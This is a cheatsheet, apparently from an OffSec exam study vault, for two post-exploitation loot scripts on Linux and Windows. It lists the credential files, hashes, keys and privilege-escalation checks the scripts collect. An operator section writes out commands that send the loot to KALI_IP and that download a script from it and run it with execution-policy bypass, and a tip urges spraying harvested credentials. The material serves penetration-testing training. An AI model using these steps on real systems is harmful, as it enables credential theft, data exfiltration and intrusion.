---
tags:
  - phase/postexploitation
  - topic/linux
  - topic/windows
  - tool/lootr
  - type/cheatsheet
---
# lootr — Linux + Windows Loot Collection Cheatsheet

> [!note] engagement Relevance
> Use **lootr.sh** on Linux footholds and **lootr.ps1** on Windows footholds to collect flags, credentials, privesc leads, and pivot data fast. This is **post-exploitation enumeration only**, which fits your OffSec workflow and should be run early after stable shell access.

---

## Usage

### Linux — `lootr.sh`

```bash
# Full run — use after stabilizing shell so you collect flags, creds, and privesc data early
./lootr.sh

# Custom output dir — useful when /tmp or cwd is a better write location on target
./lootr.sh --outdir /tmp/loot

# Quick mode — skip the slower process/service phase when time matters
./lootr.sh --quick

# Single phase — use when you only need one answer fast
./lootr.sh --phase proof
./lootr.sh --phase system
./lootr.sh --phase creds
./lootr.sh --phase network
./lootr.sh --phase files
./lootr.sh --phase procs
```

### Windows — `lootr.ps1`

```powershell
# Full run — best after you have a stable PowerShell session and writable disk location
.\lootr.ps1

# Custom output dir — useful when writing under current directory is messy or restricted
.\lootr.ps1 -OutDir C:\Windows\Temp\loot

# Quick mode — skips slower file/privesc enumeration when you need creds and flags first
.\lootr.ps1 -Quick

# Single phase — use to answer one question quickly instead of running everything
.\lootr.ps1 -Phase proof
.\lootr.ps1 -Phase system
.\lootr.ps1 -Phase creds
.\lootr.ps1 -Phase network
.\lootr.ps1 -Phase files
```

> [!tip] Transfer + Execution
> On Windows, this is most useful in a **PowerShell** context after you already have code execution. On Linux, run it after upgrading to a stable shell. Keep **Penelope** ready for your shell handling and stay inside **tmux**.

## Quick Decision Tree

```
Stable shell obtained?
│
├── Linux target
│   ├── Need everything now → ./lootr.sh
│   ├── Need speed first → ./lootr.sh --quick
│   └── Need one answer only → ./lootr.sh --phase <proof|system|creds|network|files|procs>
│
└── Windows target
    ├── Need everything now → .\lootr.ps1
    ├── Need creds/flags first → .\lootr.ps1 -Quick
    └── Need one answer only → .\lootr.ps1 -Phase <proof|system|creds|network|files>
```

## Output Layout

### Linux

```bash
loot/<hostname>/
├── summary.txt
├── progress.log
├── proof/
├── system/
├── creds/
├── network/
└── files/
```

### Windows

```powershell
loot\<hostname>\
├── summary.txt
├── progress.log
├── proof\
├── system\
├── creds\
├── network\
└── files\
```

## Phase Map

| Phase | Linux `lootr.sh` | Windows `lootr.ps1` | Why it matters |
|------|------|------|------|
| `proof` | Yes | Yes | Grab `local.txt` / `proof.txt` immediately and preserve path context |
| `system` | Yes | Yes | Build user, host, privilege, software, and task/service context |
| `creds` | Yes | Yes | Hunt reusable secrets, keys, histories, and privilege indicators |
| `network` | Yes | Yes | Identify internal listeners, routes, DNS, shares, and pivot opportunities |
| `files` | Yes | Yes | Surface privesc vectors, writable paths, backups, scripts, and interesting files |
| `procs` | Yes | No | Linux-only deeper process/service pass for manual follow-up |

## What Each Script Actually Collects

### Linux — `lootr.sh`

### `proof`

```bash
# Finds and copies proof material while also printing it to screen
local.txt
proof.txt
```

### `system`

```bash
# Gives host and privilege context for immediate manual follow-up
whoami
id
groups
sudo -ln
uname -a
/os-release
users with shells
logged-in users
installed packages
environment variables
```

### `creds`

```bash
# Prioritizes reusable auth material and files likely to contain credentials
/etc/passwd
/etc/shadow
shadow_hashes.txt
SSH private keys
authorized_keys locations
.bash_history / .zsh_history / .sh_history
.env files
wp-config.php
.netrc
.pgpass
.my.cnf
.aws/credentials
.docker/config.json
NetworkManager PSKs
Kerberos ticket data
config files matching password/secret/token patterns
```

### `network`

```bash
# Builds pivot picture and internal exposure view
ip addr / ifconfig
ip route / route -n
ip neigh / arp -a
ss -tlnp / netstat -tlnp
127.x internal listeners
/etc/hosts
/etc/resolv.conf
iptables
reachable subnets from routes
```

### `files`

```bash
# Focuses on classic Linux privesc and juicy file discovery
SUID binaries
world-writable files in sensitive dirs
recently modified files
cron jobs
file capabilities
backup files
database files
git repositories
```

### `procs`

```bash
# Slower but useful for privilege and service context
ps aux
root-owned processes
running services
root-owned world-writable tmp files
pspy reminder only
```

### Windows — `lootr.ps1`

### `proof`

```powershell
# Checks common OffSec-relevant proof locations first, then falls back to deeper search
C:\Users\*\Desktop\local.txt
C:\Users\*\Desktop\proof.txt
C:\local.txt
C:\proof.txt
C:\xampp\htdocs\local.txt
C:\inetpub\wwwroot\proof.txt
```

### `system`

```powershell
# Builds host, user, admin, software, process, and task context
systeminfo
whoami /all
Get-LocalUser
Get-LocalGroup
Administrators group membership
installed software from registry hives
Get-Process
non-Microsoft scheduled tasks
running services
startup items
hotfixes
drives / volumes
```

### `creds`

```powershell
# Mix of direct credential collection and privilege checks that often drive Windows escalation
PowerShell history files
cmdkey /list
registry AutoLogon values
unattend.xml and sysprep files
web.config / app.config / .ini / .txt pattern searches
SAM / SYSTEM / SECURITY hive access checks
RDCMan settings
WinSCP.ini
FileZilla configs
PuTTY sessions
.git-credentials
AWS credentials
Azure token/profile files
.ovpn files
Wi-Fi profiles with key material
browser credential path notes
whoami /priv export
SeImpersonatePrivilege
SeAssignPrimaryTokenPrivilege
SeBackupPrivilege
SeDebugPrivilege
```

### `network`

```powershell
# Focuses on host networking, local-only listeners, and pivot clues
Get-NetIPAddress / ipconfig
Get-NetRoute / route print
Get-NetNeighbor / arp -a
Get-NetTCPConnection / netstat -ano
127.0.0.1 listeners
hosts file
DNS servers
firewall profiles
PSDrives and mapped drives
SMB shares
```

### `files`

```powershell
# Focuses on high-value Windows privesc checks
AlwaysInstallElevated
writable PATH directories
writable service binaries
unquoted service paths
recently modified files
backup / DB files
scripts in key locations
DLL hijack candidates via writable process dirs
```

## Review Order After Execution

### Linux review order

```bash
HOST=$(hostname)

# 1. Start with summary because it surfaces the fastest wins
cat loot/$HOST/summary.txt

# 2. Flag confirmation and proof preservation
ls loot/$HOST/proof/

# 3. Crack / reuse / pivot material
cat loot/$HOST/creds/shadow_hashes.txt
ls loot/$HOST/creds/key_*
cat loot/$HOST/creds/config_files_with_creds.txt
cat loot/$HOST/creds/kerberos.txt

# 4. Direct privesc leads
cat loot/$HOST/system/sudo_rights.txt
cat loot/$HOST/files/capabilities.txt
cat loot/$HOST/files/suid_binaries.txt
cat loot/$HOST/files/cron_jobs.txt
cat loot/$HOST/files/recently_modified.txt

# 5. Pivot clues
cat loot/$HOST/network/internal_listeners.txt
cat loot/$HOST/network/reachable_subnets.txt
cat loot/$HOST/network/hosts.txt
```

### Windows review order

```powershell
$HOSTNAME = $env:COMPUTERNAME
$ROOT = ".\loot\$HOSTNAME"

# 1. Start with summary because it highlights immediate privesc and credential wins
Get-Content "$ROOT\summary.txt"

# 2. Flag confirmation
Get-ChildItem "$ROOT\proof"

# 3. Direct privesc checks
Get-Content "$ROOT\files\always_install_elevated.txt"
Get-Content "$ROOT\files\unquoted_service_paths.txt"
Get-Content "$ROOT\files\writable_service_binaries.txt"
Get-Content "$ROOT\files\writable_path_dirs.txt"
Get-Content "$ROOT\files\dll_hijack_candidates.txt"

# 4. Dangerous privileges and reusable creds
Get-Content "$ROOT\creds\privileges.txt"
Get-Content "$ROOT\creds\cmdkey.txt"
Get-Content "$ROOT\creds\autologon.txt"
Get-Content "$ROOT\creds\wifi_passwords.txt"
Get-Content "$ROOT\creds\putty_sessions.txt"

# 5. Pivot and lateral clues
Get-Content "$ROOT\network\internal_listeners.txt"
Get-Content "$ROOT\network\shares.txt"
Get-Content "$ROOT\network\mapped_drives.txt"
Get-Content "$ROOT\network\hosts.txt"
```

## When To Use Which Mode

| Situation | Linux | Windows |
|------|------|------|
| Just landed shell and need fast wins | `./lootr.sh --quick` | `.\lootr.ps1 -Quick` |
| Need flags immediately | `--phase proof` | `-Phase proof` |
| Need reusable creds for spray / lateral movement | `--phase creds` | `-Phase creds` |
| Need pivot data | `--phase network` | `-Phase network` |
| Need privesc vectors | `--phase files` and maybe `--phase procs` | `-Phase files` |
| Want full host picture for note-taking | full run | full run |

> [!tip] Workflow
> Every new credential found should feed directly into your credential reuse workflow. For AD or multi-host situations, that means immediate validation/spraying with your normal process. Do not let harvested creds sit untested.

## Common Operator Patterns

### Linux exfil

```bash
# Compress loot before transfer so you preserve structure and reduce copy pain
HOST=$(hostname)
tar czf /tmp/${HOST}_loot.tgz loot/$HOST

# HTTP pull from Kali if you can serve or fetch cleanly
curl http://KALI_IP:PORT/${HOST}_loot.tgz -o ${HOST}_loot.tgz

# SMB copy if your share is already up
cp -r loot/$HOST //KALI_IP/share/

# SCP if SSH works and creds are stable
scp -r loot/$HOST kali@KALI_IP:~/loot_${HOST}/
```

### Windows staging

```powershell
# Example transfer from Kali-served HTTP to target, then execute from temp
cd C:\Windows\Temp
iwr -Uri http://KALI_IP/lootr.ps1 -OutFile lootr.ps1
powershell -ep bypass -File .\lootr.ps1 -OutDir C:\Windows\Temp\loot
```

## Gotchas / OffSec Notes

> [!warning] Execution Context
> These scripts are **post-exploitation collection tools**, not initial enumeration tools. Run them after you already have access. Do not confuse them with your recon scripts.

> [!warning] Quick Mode Differences
> On Linux, `--quick` skips the slower **process/service** phase. On Windows, `-Quick` skips the slower **files/privesc** phase. That means a Windows quick run can miss **AlwaysInstallElevated**, **unquoted service paths**, and **DLL hijack** clues.

> [!warning] Loot Sensitivity
> The output may contain flags, hashes, private keys, Wi-Fi passwords, registry-derived creds, and ticket material. Treat the loot directory like evidence and keep host folders separated.

> [!important] High-ROI Checks
> The first files worth reviewing are usually:
> Linux: `summary.txt`, `shadow_hashes.txt`, SSH keys, `sudo_rights.txt`, `capabilities.txt`, `internal_listeners.txt`.
> Windows: `summary.txt`, `always_install_elevated.txt`, `privileges.txt`, `autologon.txt`, `cmdkey.txt`, `wifi_passwords.txt`, `unquoted_service_paths.txt`.

## Quick Reference

| Goal | Best phase | High-value files |
|------|------|------|
| Get flags fast | `proof` | `proof/*` |
| Find creds to reuse | `creds` | Linux: `shadow_hashes.txt`, `key_*`; Windows: `cmdkey.txt`, `autologon.txt`, `wifi_passwords.txt` |
| Find local privesc | `files` | Linux: `suid_binaries.txt`, `capabilities.txt`, `cron_jobs.txt`; Windows: `always_install_elevated.txt`, `unquoted_service_paths.txt`, `writable_service_binaries.txt` |
| Find pivot paths | `network` | `internal_listeners.txt`, routes, shares, mapped drives, hosts |
| Build host notes | `system` | user/group/process/service/software context |

## Related

- [[OffSec_Exam_Methodology_Complete]]
- [[Reverse_Shells]]
- [[Linux_PrivEsc]]
- [[Windows_PrivEsc]]
- [[pivotr]]
- [[sprayr]]
- [[crackr]]
- [[servr]]
